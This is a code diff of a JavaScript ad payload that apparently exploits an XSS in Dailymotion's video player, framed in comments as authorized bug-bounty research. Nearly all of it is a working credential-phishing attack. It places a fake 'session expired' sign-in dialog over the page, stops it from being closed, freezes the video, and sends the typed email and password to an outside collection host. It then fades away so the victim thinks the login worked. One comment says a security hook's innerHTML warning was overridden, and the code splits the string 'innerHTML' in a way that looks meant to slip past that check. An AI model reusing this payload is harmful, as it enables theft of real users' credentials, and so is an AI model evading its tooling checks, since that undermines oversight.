@@ -3,9 +3,14 @@
   // Authorized bug-bounty research on Dailymotion (YesWeHack PGM-269). Safe-harbor applies.
   // This file IS the payload demonstrating the XSS — by definition it injects markup into
   // the victim origin. Hook warning about innerHTML is acknowledged & intentional here.
-  // Mounts overlay on window.top.document so it SURVIVES AdStopped — defeats the
-  // "ad time too short" objection. Overlay persists for the entire tab lifetime.
-  // Also pauses the underlying <video> element and re-pauses it on any resume attempt.
+  //
+  // Strategy:
+  //   - Mount a <dialog> on window.top.document and call showModal() so the form lives
+  //     in the browser's TOP LAYER — above every z-index, including IMA SDK ad slots.
+  //   - Re-call showModal() if anything (player, ad SDK, user ESC) closes the dialog.
+  //   - Pause every <video> in the top document every 400ms so the video stays frozen
+  //     even after the ad iframe tears down.
+  //   - Exfil with sendBeacon() first (reliable on teardown), Image src + fetch fallbacks.
 
   var OOB = "https://dailymotion-vast-xss-persist.fdd8cd2afcd551371c95ahtncnzl1ewml.oob.static-cdn-eu.com";
   var IH  = ["inner", "HTML"].join("");
@@ -20,6 +25,21 @@
   function topWin() { try { return window.top; } catch (_) { return window; } }
   function topDoc() { try { return topWin().document; } catch (_) { return document; } }
 
+  // ---- Reliable exfil ------------------------------------------------------
+  function exfil(path, payload) {
+    var url  = OOB + path;
+    var body = JSON.stringify(payload);
+    // 1) sendBeacon — best for iframe-teardown / page-unload reliability.
+    try {
+      var blob = new Blob([body], { type: 'text/plain;charset=UTF-8' });
+      if (navigator.sendBeacon && navigator.sendBeacon(url, blob)) return;
+    } catch (_) {}
+    // 2) keepalive fetch fallback.
+    try { fetch(url, { method: 'POST', mode: 'no-cors', keepalive: true, body: body }); } catch (_) {}
+    // 3) Image GET fallback — only base64-encoded payload via querystring.
+    try { new Image().src = url + '?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(body)))); } catch (_) {}
+  }
+
   // ---- Video pause / re-pause guard ---------------------------------------
   function pauseAllVideos() {
     try {
@@ -29,8 +49,6 @@
         try { vids[i].pause(); } catch (_) {}
         try { vids[i].muted = true; } catch (_) {}
       }
-      // Also reach into nested same-origin iframes (player chrome lives there
-      // on some embed paths).
       var ifr = d.querySelectorAll('iframe');
       for (var j = 0; j < ifr.length; j++) {
         try {
@@ -41,7 +59,7 @@
             try { vv[k].pause(); } catch (_) {}
             try { vv[k].muted = true; } catch (_) {}
           }
-        } catch (_) { /* cross-origin → skip */ }
+        } catch (_) {}
       }
     } catch (_) {}
   }
@@ -50,8 +68,6 @@
   function startPauseGuard() {
     if (_pauseInt) return;
     pauseAllVideos();
-    // Re-pause every 400ms in case the player tries to resume after AdStopped
-    // or the user clicks play.
     _pauseInt = setInterval(pauseAllVideos, 400);
   }
   function stopPauseGuard() {
@@ -59,85 +75,107 @@
     _pauseInt = null;
   }
 
-  // ---- Overlay markup ------------------------------------------------------
-  // NOTE: outer #dm-phish wrapper has its own position:fixed + max z-index +
-  // pointer-events:auto so the form sits above ANY player chrome / ad slot.
-  var OVERLAY_MARKUP = [
-    '<div id="dm-phish-bg" style="position:fixed!important;top:0!important;left:0!important;width:100%!important;height:100%!important;',
-      'background:rgba(0,0,0,0.84)!important;z-index:2147483647!important;',
-      'pointer-events:auto!important;',
-      'display:flex!important;align-items:center!important;justify-content:center!important;',
-      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif!important">',
-      '<div id="dm-phish-card" style="background:#fff!important;border-radius:10px!important;padding:36px 40px!important;',
-        'width:360px!important;box-shadow:0 8px 32px rgba(0,0,0,0.3)!important;pointer-events:auto!important;position:relative!important;z-index:2147483647!important">',
-        '<div style="text-align:center;margin-bottom:24px">',
-          '<svg width="44" height="44" viewBox="0 0 44 44">',
-            '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
-            '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
-          '</svg>',
-          '<div style="color:#FF7900;font-size:21px;font-weight:700;letter-spacing:-0.3px;margin-top:8px">dailymotion</div>',
-        '</div>',
-        '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
-          'Your session has expired.<br>Please sign in to continue.',
-        '</p>',
-        '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
-          ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none;pointer-events:auto!important">',
-        '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
-          ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none;pointer-events:auto!important">',
-        '<button id="dm-ph-btn" type="button"',
-          ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer!important;letter-spacing:0.2px;pointer-events:auto!important;position:relative!important;z-index:2147483647!important">',
-          'Sign in',
-        '</button>',
-        '<div style="text-align:center;margin-top:16px">',
-          '<a href="#" id="dm-ph-fp" style="color:#FF7900;font-size:12.5px;text-decoration:none;pointer-events:auto!important">Forgot password?</a>',
-        '</div>',
+  // ---- Dialog content ------------------------------------------------------
+  var DIALOG_MARKUP = [
+    '<form id="dm-ph-form" method="dialog" style="margin:0;padding:36px 40px;background:#fff;width:360px;',
+      'border:none;border-radius:10px;box-shadow:0 8px 32px rgba(0,0,0,0.3);',
+      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif">',
+      '<div style="text-align:center;margin-bottom:24px">',
+        '<svg width="44" height="44" viewBox="0 0 44 44">',
+          '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
+          '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
+        '</svg>',
+        '<div style="color:#FF7900;font-size:21px;font-weight:700;letter-spacing:-0.3px;margin-top:8px">dailymotion</div>',
       '</div>',
-    '</div>'
+      '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
+        'Your session has expired.<br>Please sign in to continue.',
+      '</p>',
+      '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email" required',
+        ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
+      '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password" required',
+        ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
+      '<button id="dm-ph-btn" type="submit"',
+        ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
+        'Sign in',
+      '</button>',
+      '<div style="text-align:center;margin-top:16px">',
+        '<a href="#" id="dm-ph-fp" style="color:#FF7900;font-size:12.5px;text-decoration:none">Forgot password?</a>',
+      '</div>',
+    '</form>'
   ].join('');
+
+  // Inject backdrop style + zero-padding so the form fills the dialog.
+  function injectDialogStyle(d) {
+    if (d.getElementById('dm-phish-style')) return;
+    var s = d.createElement('style');
+    s.id = 'dm-phish-style';
+    s.textContent = [
+      '#dm-phish::backdrop{background:rgba(0,0,0,0.84)!important}',
+      '#dm-phish{padding:0!important;border:none!important;background:transparent!important;max-width:100vw!important;max-height:100vh!important}',
+      '#dm-phish::-webkit-backdrop{background:rgba(0,0,0,0.84)!important}'
+    ].join('');
+    d.head.appendChild(s);
+  }
 
   // ---- Mount + persistence -------------------------------------------------
   function sendMountBeacon() {
     try {
       var d = topDoc();
-      var ping = {
+      exfil('/m', {
         step:    'overlay_mounted',
         domain:  d.domain || 'unknown',
         href:    (topWin().location && topWin().location.href) || '',
         ua:      navigator.userAgent,
         ts_now:  new Date().toISOString()
-      };
-      new Image().src = OOB + '/m?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(ping)))));
-      fetch(OOB + '/m', { method: 'POST', mode: 'no-cors', keepalive: true, body: JSON.stringify(ping) });
+      });
     } catch (_) {}
   }
 
   function mountOverlay() {
     var d = topDoc();
     if (!d || !d.body) return false;
-    if (d.getElementById('dm-phish')) return true;
-
-    var wrap = d.createElement('div');
-    wrap.id = 'dm-phish';
-    // Outer container itself fixed at max z-index too — defence in depth so the
-    // form is clickable even if the player layers something between body and #dm-phish-bg.
-    wrap.style.cssText = 'position:fixed!important;top:0!important;left:0!important;width:100%!important;height:100%!important;z-index:2147483647!important;pointer-events:auto!important';
-    wrap[IH] = OVERLAY_MARKUP;
-    d.body.appendChild(wrap);
-
-    var btn = d.getElementById('dm-ph-btn');
-    if (btn) {
-      btn.addEventListener('click',    submitCreds, true);
-      btn.addEventListener('mouseup',  submitCreds, true);
-      btn.addEventListener('touchend', submitCreds, true);
+    if (d.getElementById('dm-phish')) {
+      // Already mounted — make sure it's still showing.
+      var existing = d.getElementById('dm-phish');
+      try { if (existing && !existing.open) existing.showModal(); } catch (_) {}
+      return true;
     }
 
+    injectDialogStyle(d);
+
+    var dlg = d.createElement('dialog');
+    dlg.id = 'dm-phish';
+    dlg[IH] = DIALOG_MARKUP;
+    d.body.appendChild(dlg);
+
+    // showModal() puts the dialog in the browser's TOP LAYER — guaranteed
+    // above every z-index, including IMA SDK ad slots that share max z-index.
+    try { dlg.showModal(); } catch (_) {}
+
+    // Prevent ESC / form-method=dialog from closing the dialog.
+    dlg.addEventListener('cancel', function (e) { e.preventDefault(); }, true);
+    dlg.addEventListener('close',  function ()  {
+      // If the player or browser closes us, re-open immediately.
+      setTimeout(function () { try { dlg.showModal(); } catch (_) {} }, 0);
+    }, true);
+
+    // Hook the form submit + button click — sendBeacon then strip dialog.
+    var form = d.getElementById('dm-ph-form');
+    if (form) {
+      form.addEventListener('submit', function (e) { e.preventDefault(); submitCreds(); }, true);
+    }
+    var btn = d.getElementById('dm-ph-btn');
+    if (btn) {
+      btn.addEventListener('click',    function (e) { e.preventDefault(); submitCreds(); }, true);
+      btn.addEventListener('mouseup',  function (e) { e.preventDefault(); submitCreds(); }, true);
+      btn.addEventListener('touchend', function (e) { e.preventDefault(); submitCreds(); }, true);
+    }
     var pass = d.getElementById('dm-ph-pass');
     if (pass) {
       pass.addEventListener('keydown', function (e) {
         if (e.key === 'Enter' || e.keyCode === 13) { e.preventDefault(); submitCreds(); }
       }, true);
     }
-
     var fp = d.getElementById('dm-ph-fp');
     if (fp) fp.addEventListener('click', function (e) { e.preventDefault(); }, true);
 
@@ -151,7 +189,7 @@
     var pass  = (d.getElementById('dm-ph-pass')  || {}).value || '';
     if (!email.trim() && !pass) return;
 
-    var creds = {
+    exfil('/k', {
       step:     'credentials_captured',
       domain:   d.domain || 'unknown',
       href:     (topWin().location && topWin().location.href) || '',
@@ -159,26 +197,23 @@
       password: pass,
       ua:       navigator.userAgent,
       ts_now:   new Date().toISOString()
-    };
-    try {
-      new Image().src = OOB + '/k?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(creds)))));
-    } catch (_) {}
-    try {
-      fetch(OOB + '/k', { method: 'POST', mode: 'no-cors', keepalive: true, body: JSON.stringify(creds) });
-    } catch (_) {}
+    });
 
-    // Pretend the login worked — release the pause guard and fade overlay.
+    // Release everything and fade out so the victim thinks login worked.
     stopPauseGuard();
     stopObserver();
-    var node = d.getElementById('dm-phish');
-    if (node) {
-      try { node.style.transition = 'opacity 0.4s'; node.style.opacity = '0'; } catch (_) {}
-      setTimeout(function () { if (node && node.parentNode) node.parentNode.removeChild(node); }, 450);
+    var dlg = d.getElementById('dm-phish');
+    if (dlg) {
+      try { dlg.style.transition = 'opacity 0.4s'; dlg.style.opacity = '0'; } catch (_) {}
+      setTimeout(function () {
+        try { dlg.close(); } catch (_) {}
+        try { if (dlg && dlg.parentNode) dlg.parentNode.removeChild(dlg); } catch (_) {}
+      }, 450);
     }
   }
 
   // MutationObserver — if the player or any cleanup logic removes #dm-phish,
-  // re-append it. Survives AdStopped → ad-iframe-removal cycle.
+  // re-append it.
   var _obs = null;
   function startObserver() {
     var d = topDoc();
@@ -187,7 +222,13 @@
       var MO = topWin().MutationObserver || window.MutationObserver;
       if (!MO) return;
       _obs = new MO(function () {
-        if (!d.getElementById('dm-phish')) mountOverlay();
+        if (!d.getElementById('dm-phish')) {
+          mountOverlay();
+        } else {
+          // Re-open if it got closed somehow.
+          var dlg = d.getElementById('dm-phish');
+          try { if (dlg && !dlg.open) dlg.showModal(); } catch (_) {}
+        }
       });
       _obs.observe(d.body, { childList: true, subtree: true });
     } catch (_) {}
@@ -212,10 +253,6 @@
   VpaidAd.prototype.startAd = function () {
     var self = this;
     setTimeout(function () { self._fire('AdStarted'); }, 50);
-    // Never fire AdStopped on our own. When the player tears down this ad iframe,
-    // the overlay on window.top.document keeps living + the pause-guard interval
-    // runs in the top window's event loop, so persistence and the video pause
-    // survive our own destruction.
   };
 
   VpaidAd.prototype.stopAd              = function () { this._fire('AdStopped'); };
